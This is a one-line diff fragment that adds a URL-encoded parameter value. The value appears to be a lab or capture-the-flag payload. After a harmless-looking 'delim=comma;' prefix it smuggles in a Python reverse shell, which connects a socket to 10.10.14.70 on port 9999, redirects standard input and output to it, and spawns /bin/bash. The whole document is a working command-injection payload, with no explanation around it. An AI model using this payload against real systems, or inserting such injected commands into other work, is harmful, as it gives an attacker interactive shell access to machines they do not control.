@@ -1,0 +1,1 @@
+delim=comma;python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs.connect(("10.10.14.70",9999))%3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn("/bin/bash")'
